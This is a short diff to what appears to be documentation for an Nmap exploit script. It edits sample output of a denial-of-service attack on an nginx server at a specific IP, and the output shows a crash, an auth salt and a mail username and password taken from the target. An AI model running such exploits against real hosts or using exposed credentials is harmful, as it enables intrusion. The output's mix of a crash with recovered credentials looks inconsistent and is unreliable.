@@ -422,7 +422,7 @@ Note: --script-args exploit="true" argument trys to exploit the denial-of-servic
 Output
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-30 15:49 +0100
 NSE: trying to exploit the denial-of-service in: 149.255.39.67
-NSE: CloneDomain::PlainTextEmailAddress: postmaster@hvvc.us
+NSE: CloneDomain::AuthenticationDomain: postmaster@hvvc.us
 Nmap scan report for 149-255-39-67.static.hvvc.us (149.255.39.67)
 Host is up (0.13s latency).
 
@@ -442,7 +442,9 @@ PORT   STATE SERVICE
 |  Exploit results:
 |    target addres: 149.255.39.67
 |    nginx version: NGINX Plus R32 [vulnerable version]
-|    nginx payload: CRASH DETECTED AFTER PAYLOAD WAS PROCESSED
+|    nginx payload: CRASH DETECTED AFTER SENDING AUTH-SALT PAYLOAD
+|       auth_status : OK
+|       auth_salt   : sRaa9nqd.1777620180@hvvc.us
 |    mail_username: postmaster@hvvc.us
 |    mail_password: testingCVE27651
 |  * module Author: r00t-3xp10it
